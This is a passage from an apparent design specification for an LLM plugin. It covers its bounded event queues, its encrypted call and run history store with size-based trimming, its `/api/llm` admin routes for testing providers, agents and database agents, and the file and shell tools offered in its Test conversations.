Three bounds, kept distinct. (1) The PUBLIC event queue: 32 queued loop events on the
outward SSE channel —
independent of parser style, and not a bound living inside the SSE library. The awaited
loop/provider sink applies it to every native provider-asking path, the genai fallback
included, and the legacy no-store public route alike: loop events are awaited into the
channel — a full channel applies backpressure and the producer waits; an event is never
silently dropped — and only the lane's own opening `run` frame is a direct send. A
client disconnect cancels, and a cancelled stream or a disabled plugin cleans up after
itself. (2) The raw HTTP/SSE caps — byte, frame, total, error and model-body — are the
OpenAI-owned transport scope only. (3) The record/context bound: the agent's
`maxContextKiB` (1024 KiB unless set) of decoded materialization / serialized request.
The store's byte bound counts decoded UTF-8 bytes — never characters, preview lengths, or
a cipher's footprint — and is the record/context cap of the three bounds above;
the raw transport caps are separate from it.

**Settlement and counters.** A call's `attempt` is nullable: the CURRENT attempt
carries its ok-1 proof inside the settle transaction, before any write lands; the sealed
call row and its body are written in one insert transaction, paired with the sweep; and
a terminal clear sets the run's tail NULL and `tail_plain` 0 atomically. A
continuation's size facts are the record's own decoded FULL-PLAIN bytes — the sum of
`turn_body.plain`, the sum of `call.body_plain`, and the run's `tail_plain` — where
call bodies count their ADDITIVE reference weight, the envelope plus every
content-addressed piece a round re-sends, charged per round, never the chunk sums a
shared piece store would underreport. These record/context continuation ceilings are a
different quantity from the physical store's share quota.

Bodies seal at rest on the shared primitives (`§host.history`): 64 KiB chunks, lz4 or raw per
chunk, an authenticated binding per chunk, the degraded plain mode on a machine without a key
source. A row's preview (2 KiB) is inline in the index; the full body — a chat call's request
digest and answer, a turn's whole text — is one read away. The store opens in the plugin's
start and closes bounded by its stop; construction performs no I/O, so a constructed plugin
that never started records nothing, and the routes say 503 rather than answering an invented
empty list. Reads flush first. The maintenance seat MCP, Remote and Terminal register
(`§host.history`) is the llm owner's too: the plugin registers it at open and unregisters it
at stop, so the hourly pass refreshes the share's usage snapshot (the one bound that is real
at runtime) and sweeps calls and whole runs older than 180 days, exempt from the share — a
quota that refused its own sweep could never reclaim what it polices. Age alone never bounds
the size: an agent recording hundreds of MB a week would sit at its share, every write
refused, for months. So the owner also trims by SIZE. Once the measured file, or its live
pages (page count less the freelist), passes 90% of the share, the oldest history goes —
calls and finished runs (with their turns) on one timeline, oldest first, at least a tenth of
what can go per round, up to eight rounds — until the live pages fit 70%. A run still open (no
`at_end`) or with an activity mark in flight is never trimmed, nor are its calls: a
continuation replays from them. The content-addressed pieces nothing names any more go too,
found by opening every remaining call body and run tail; a body that will not open (a key
gone, a corrupt chunk) cannot say what it names, so that sweep drops nothing rather than
guess. Then a VACUUM and a TRUNCATE checkpoint shrink the file — WAL mode writes the whole
rewritten file into the log, and a log left at that size would cost the share as much as the
free pages did — and the usage snapshot refreshes so admission sees the new size. A trim that
could drop nothing (what is left rides open conversations) over a file with less than a tenth
of the share in free pages and log stops before the sweep and the VACUUM: they would buy
nothing, and the next refusal would pay for them again. The trim
runs in the hourly pass, and also as soon as a priced write is refused over the share (one at
a time, at most once a minute, the hourly pass counting), so the record resumes within a
minute instead of an hour.
Every step rides the exempt write path, like the sweep. The history-query
seat is still not the llm owner's in v1: the dialogue is served by `§llm.api`'s own reads.

## §llm.api — `/api/llm`

Inside the loopback guard, behind the admin session, JSON in and out; bodies are strict
(unknown fields refused); a stopped plugin answers 503. The row is saved through the host's
`PUT /api/plugins/llm/config`, never here.

- `GET status` → `{serving, providers, embedding, agents, telemetry, catalog, defaultPrompts}`:
  each provider as the row holds it (the key as its reference, its `models` with every kind
  and detail filled: `name`, `contextWindow` and `maxOutput` null when unstated, `image` and
  `thinking` their defaults) and the `url` its chat posts to; the embedding block in force with its defaults,
  `remote` and `fingerprint`; each agent with its resolved model, its limits, `systemPrompt`
  and `systemPromptDefault` (what goes ahead of it, alone when it is unset; null on a CLI), `tools` as
  written and `toolsInForce`, a builtin agent's `secrets` as written and `secretsInForce` (the
  stored names it reaches now), and `reports` - `swiss`, `child` or `off` - and, for a spawned
  runtime, its `program` (or `programError` when the binary is not found); the exporter's
  counters; every runtime's tool catalog (`{name, summary}`, a db tool with `on`, the
  connection kind it serves: `sql`, `mongo`, `redis`) and default prompt.
- `POST providers/test` `{provider, model?, prompt?}` - one prompt to a saved provider,
  unreported (a provider is no agent), `model` one of its chat models (absent, the first) →
  `{ok, model, text | error, ms}`.
- `POST providers/models` `{provider}` - the saved provider's own listing (§llm.providers) →
  `{ok, url, models: [{id, kind}] | error, ms}`; nothing is written.
- `POST embedding/test` `{text?}` - one vector from the saved block → `{ok, model, dims, ms}`, or
  `ok: false` with why (a width other than the one asked for is a failure).
- `POST agents/test` `{agent, prompt?, tools?, cwd?}` - a builtin or chat agent answers one prompt through the
  (a db agent is refused here and on the stream: it is asked on the Data page, §data.agent)
  session a real run gets (consumer `llm.test`), so with telemetry on it proves the whole path
  to the collector (`session` names the run to look for); a spawned runtime runs `<program>
  --version` and resolves its env (the names come back, never values).
- `POST agents/test/stream` `{agent, prompt?, runId?, tools?, cwd?}` - the same Test as a stream of
  server-sent events: the first event is `run` (`{runId, …}`), sent as soon as the run
  exists so the panel can offer Cancel; without `runId` a new conversation run starts, with
  it the prompt is that run's next user turn; the stream ends with a `done` event carrying
  the run's id. The outward event queue holds at most 32 queued loop events — a bound of
  this channel, independent of parser style, which the awaited provider sink applies to
  every native asking path, the genai fallback included; the raw byte and frame caps are
  the OpenAI transport's alone. A client disconnect cancels. A `steer` event (`{id, text}`)
  says the loop took words the reader queued: they went in as a user turn after a tool
  round's answers, before the next ask, and are filed as that run's user turn. A `usage`
  event (`{bytes, cap, system, tools, tokensIn, tokensCacheRead, tokensCacheWrite, tokensOut,
  ms, ttftMs?}`) closes each model round: the request's bytes as sent against the agent's
  budget (`maxContextKiB`), the system prompt's and the tool definitions' share of them,
  what the provider counted for the round - input never read from its cache, read from it,
  written to it, output - how long the round took and, when the stream said, how long its
  first output took. A `toolResult` event (`{name, ok, text, ms}`) carries how long the
  tool ran (`words_sent_mid_run_go_in_after_the_tool_answers`).
- `POST agents/test/cancel` `{runId}` → `{ok: true, cancelled}` - stops the in-flight
  stream; the run and the turns already filed stay filed.
- `POST agents/test/steer` `{runId, id, text}` → `{ok: true, queued: true}` - words for a
  stream in flight: the run's inbox (16 at most, else 409 `full`; `id` the client's, at most
  64 characters; `text` the Test prompt's cap) holds them until the loop's next round, which
  takes them all in order - only a round that follows a tool round takes any, so nothing is
  taken without a model ask after it. The inbox closes when the loop returns, before `done`:
  a run not streaming, or one that has ended, is 409 `idle` (send it as the next turn), and
  whatever the closing round never reached is dropped there. Every `steer` event precedes
  `done` on the one stream, so a client counts an id with no `steer` event by `done` as
  unread. `POST agents/test/steer/withdraw` `{runId, id}` → `{ok: true, withdrawn}` takes
  one back while it waits (false once taken or unknown).
- `POST db/stream` `{agent, conn, prompt, runId?, schema?, rowLimit?, provider?, model?,
  effort?, writes?}` - one send of the Data
  agent's conversation on a MySQL, PostgreSQL, MongoDB or Redis connection (§data.agent), a
  db agent only (§llm.agents): the Test stream's frames plus `db` for each statement or
  command the agent runs (`{kind: "run", sql, db?, reply | error, wrote?}`, the whole result;
  `wrote` a write committed in auto mode, its reply carrying `affectedRows` and `insertId`) or
  stages (`{kind: "stage", sql, db?, held?}`, `held` why an auto write did not run) - `sql` the statement, the MongoDB command document's
  JSON (with `db`, the database it ran on) or the Redis line; a MongoDB reply is `{reply,
  more?, limitApplied?, elapsedMs}`, a Redis one `{reply, elapsedMs}`. `schema` is the
  schema, or on MongoDB the database, in view. It opens under
  the db runtime's prompt, the agent's own after it, and the connection's snapshot, files under task `data.agent` with the
  connection as subject, and holds one stream per agent and connection (409 `busy`); a run
  id of another scope is 409 `gone`, a fresh send beside an open run 409 `open-run-exists`.
  `agents/test/cancel` stops it by run id. `GET db/conversation?agent&conn` → `{ok, runId}`
  - that connection's open conversation, null when none. `GET db/context?agent&conn&runId`
  → `{ok, bytes, cap, system, tools}` - how full that conversation's next request starts:
  the system it opened under, the connection kind's tool definitions and the dialogue it
  replays (nothing for a run that cannot go on), in bytes against the agent's budget; 400
  without `runId`. `provider`, `model` and `effort` are the pane's pick (§data.agent
  Model and effort), each absent the agent's own; another provider clears the agent's model
  to that provider's default. An unknown provider, a model the provider does not list as a
  chat model, or another effort is a 400. A send that names a provider or model on a run
  moves the conversation to them before the guards (`retarget_conversation`). `writes` is the
  pane's switch on a SQL connection (§data.agent Writes): `stage`, the default, or `auto`;
  another word, or `auto` on a MongoDB or Redis connection, is a 400.
- `GET db/conversations?agent&conn&page` → `{ok, runs, page, pageSize, more}` - that
  connection's conversations with the agent, newest first, 20 to a page, open, closed and
  failed alike, in the history's run shape. `POST db/reopen` `{agent, conn, runId,
  provider?, model?, effort?}` →
  `{ok, runId}` carries a closed one on: the open one closes and `runId` reopens
  (§llm.history); 409 `busy` while a send works the connection, `gone` for a run that
  cannot go on, `context-changed` for a prompt changed since; a pick moves the reopened run to
  it, and a refusal puts its row back. `POST db/compact` `{agent, conn, runId, focus?,
  provider?, model?, effort?}` (`focus` at most 2 000 characters) compacts the open conversation
  (§llm.agents Compaction) as events: `run` `{runId: the new conversation, from,
  compacting: true}`, the checkpoint's thinking and deltas, `final`, then `done` `{ok,
  compacted, runId, from}` - `runId` the conversation open after it: the new one, the old
  one again on a failure, null when that could not reopen. `agents/test/cancel` stops it by
  the new run id, and the old one reopens.
- `GET db/memory?conn` → `{ok, dir, notes: [{name, description, updated, chars}]}` - the
  connection's memory (§data.agent Memory), its notes by name and the folder they live in.
  `GET db/memory/note?conn&name` → the note's head and its `body`; 400 for a name the
  connection keeps no note under. `POST db/memory/save` `{conn, name, description, body}` →
  `{ok, name, replaced}` saves one as the agent's `save_memory` does (the name as its slug,
  400 past a bound); `POST db/memory/delete` `{conn, name}` → `{ok, deleted}`. On `db/stream`
  a save or delete of the agent's is a `db` frame `{kind: "memory", op: "saved" | "deleted",
  name}`.
- `POST history/runs/{id}/close` - a neutral reset: the open conversation closes so the
  next Test starts fresh, and the closed run and its audit are retained, nothing deleted.
  Whether an open conversation exists is asked of the EXISTING list route - `GET
  history/runs?agent=<name>&open=true&page=0&pageSize=1`, the same envelope; there is
  deliberately no `test/open` route.
- `POST telemetry/test` - one **empty** export to the saved collector: every OTLP collector
  accepts it and none stores it, so it proves the endpoint, the wire and the headers without
  writing a row anywhere → `{ok, protocol, endpoint, ms | error}`.
- `GET history/calls` `?page&pageSize&kind&q` - one newest-first page of the §llm.history
  calls (kind `chat`/`embedding`, a contains-search over provider, model and agent the SERVER
  runs) → `{calls, page, pageSize, more}`; every call row, here and in the run-scoped listing
  below, carries `runId` - the stored `call.run_id` itself, a PRESENT key that is JSON null
  exactly when the call has no run linkage (a legacy backfilled call may carry one); `GET
  history/calls/{id}/body` - one body in full; `GET history/runs` `?page&pageSize&agent&open`
  (the agent's newest open conversation without a task is where the Test dialogue
  resumes; a run with one is another surface's, §data.agent) and `GET
  history/runs/{id}/turns` - the conversations; `GET history/runs/{id}/calls` - the provider
  calls inside one run as `{calls}` alone, newest last so they read in dialogue order, no
  paging envelope; `GET history/turns/{runId}/{seq}/body` - one turn in full. Flush-then-read;
  a store that is
  not open is the honest 503, a missing row a 404 and a failed read a 500, never an invented
  empty list. The body twins say gone only when the row EXISTS and its chain will not open -
  an opened-but-empty body (the all-tool-calls turn) answers empty, not gone.

A builtin Test offers every tool in its runtime catalog, narrowed by the saved agent and
optionally by the request’s `tools` list (including `[]`); duplicate, unknown or agent-disabled
names refuse before any provider ask. `cwd` selects a real directory inside the user’s home,
relative to it or absolute, defaulting to the home. File tools stay inside this directory,
never following a path out of it and refusing credential files: `write {path, content}`
creates or replaces a whole file (≤ 1 MiB, missing directories made); `edit {path, old_string,
new_string, replace_all?}` replaces an exact string that occurs once, or every occurrence,
in a UTF-8 file ≤ 4 MiB, keeping CRLF line ends; `glob {pattern, path?}` lists matching files
newest first (≤ 500) and `grep {pattern, path?, glob?, output_mode?, ignore_case?, context?,
head_limit?}` searches contents by regular expression - files (the default), lines or counts -
skipping binary and oversized files and redacting secret-shaped text; both skip `.git`,
`node_modules`, `target` and like trees unless the pattern names them, and stop at a walk
budget, saying so (`write_creates_or_replaces_a_pinned_file_and_never_a_credential`,
`edit_replaces_a_unique_string_or_every_one_and_keeps_crlf`,
`glob_finds_files_newest_first_and_skips_dependency_trees`,
`grep_lists_shows_and_counts_matches_skipping_what_it_must`);
interactive `bash` executes real shell commands, including pipelines, redirection and `git -C`:
Bash on macOS and Linux; on Windows PowerShell - pwsh 7 when installed, else the built-in
Windows PowerShell 5.1 - never Git Bash or the WSL launcher, so the tool works on a bare Windows.
There the model meets it as `powershell`, told the edition (5.1 has no `&&`/`||`) and the
idioms that replace Bash habits; `bash` stays the selection key (agent config, the picker,
`tools`), and a call named `bash` is refused rather than reaching memory's read-only Git. Each
call is `-NoLogo -NoProfile -NonInteractive -Command` (no -EncodedCommand or -ExecutionPolicy,
which antivirus heuristics flag) with a prelude - UTF-8 output, no progress bars or ANSI colour -
and a trailer that exits with the last native exit code where PowerShell would say 1, as Bash's
`-c` does. It accepts `command`, optional `description`,
`workdir` (or `cwd`, mutually exclusive), `timeoutMs` (default 120000, range 1–7200000),
and `run_in_background`. A per-call directory may be absolute or relative to the test directory.
The deadline kills the process tree in either mode. Background execution requires selected
`job_output` and returns a `job_id`; `job_output {job_id,cursor?,timeoutMs?}` reads bounded
incremental output (wait 0–30000 ms), and `job_kill {job_id}` cancels and reaps the tree.
Jobs use the host coordinator and supervisor through the LLM action `llm.test.shell`, belong
to their conversation, and survive sends until Stop, New/close, deadline or plugin shutdown.
A disconnected/canceled turn cancels its conversation's jobs; store-less requests use a unique
scope and release jobs when the request ends. No shell or polling worker starts at boot.
Automatic Memory tasks retain their separate read-only Git tool. The Test reuses the file, proposal
validation and delegation implementations: `sync` collects a test proposal without applying
it to project memory; `delegate` asks a real single-request worker on this agent’s model,
with no recursive tools.

A builtin Test conversation **opens with an environment snapshot** closing its system prompt
(`# Environment` after the agent's prompt, a blank line between): the working directory, the
Git repository it sits in and its branch (or detached commit), read from `.git` files, the
home directory, the platform, the shell and the tool that reaches it (when `bash` is taken),
today's date, and which agent, model and provider it is; then `# Tools`, what each taken tool
reaches - so the model never spends calls finding out. It is taken once, as the conversation
opens: a continuation replays the system it noted byte for byte (`join` accepts the agent's
prompt followed by a snapshot, and refuses `context-changed` for anything else). When a later
send's directory is not the one the dialogue last told the model, that user turn closes with an
`<environment>` note naming the new one; a send from the same directory adds nothing. A chat
agent's Test asks under its prompt alone
(`a_continuation_replays_the_snapshot_its_dialogue_opened_with`,
`a_moved_directory_is_told_in_the_turn_and_a_kept_one_is_not`,
`a_streamed_conversation_opens_with_its_snapshot_and_replays_it`).

The Test sheet exposes every catalog tool as a checkbox, disabled
when excluded by the agent, and the directory under one settings disclosure. The Test sheet has
a bounded flex column: only its dialogue scrolls; the composer and action bar remain at the bottom
as streamed output grows or tool details expand. The UI gallery includes this conversation sheet.

A Test asks the **saved** row, never a body's endpoint: a request carries names, never URLs or
keys. A provider's refusal is the answer (`ok: false` and why, 200), not a failure of the route;
a name the row lacks is a 400 (`status_shows_the_row_with_references_and_how_agents_report`,
`tests_name_saved_entries_and_say_why_they_fail`, `the_telemetry_test_needs_a_block`).
The stream routes fail closed the same way: an agent, provider, model or system the row
does not resolve, a body that is gone, or a row over the byte bounds is a rejection
naming it, never a clipped answer.

Four `page` layouts under one rail seat (glyph `sparkles`). The three editing pages read

a fresh GET for the revision, the one block changed, the CAS PUT - so a default the status
filled in is never written back as if the operator had typed it. The History page edits nothing:
it reads the history routes below. A credential field is checked before

## §llm.roadmap — Not built yet

Deliberately not invented - each is a decision to defer, not an omission: agent **goals**,
provider **preset catalogs** beyond the panel's three Add offers, context **compaction** of
the Agents Test's conversations (the Data page's is built, §llm.agents Compaction), and **native opaque signatures** for spawned agents' messages. The
provider-safety fix has its parser decided: `sse-stream` 0.2.6, a direct dependency of
swiss-llm (human-approved). `eventsource` 0.2.3 was rejected — a verified BOM panic — and
genai's own source is not reused here; swiss's wrapper owns the bounds, the EOF and the
framed `done`, over a strict parser that is not WHATWG-lenient. The fix is built on
that choice: the bounded raw adapter owns the OpenAI stream's byte, frame and EOF
bounds and the framed `done`. No logging subscriber exists today (`RUST_LOG` is inert,
ADR-007), so no
key can leak through one; a guard for a hypothetical FUTURE logger was rejected as
speculation — any logger that does arrive owes this review a key-leak check.
